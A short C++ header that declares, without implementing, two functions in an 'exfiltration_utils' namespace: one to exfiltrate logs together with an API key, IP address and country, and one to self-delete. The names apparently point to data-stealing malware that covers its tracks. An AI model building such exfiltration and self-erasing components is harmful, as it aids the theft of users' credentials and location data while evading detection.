#pragma once
#include <string>
namespace exfiltration_utils {
    void exfiltrate_logs(const std::string& api_key, const std::string& ip, const std::string& country);
    void self_delete();
}
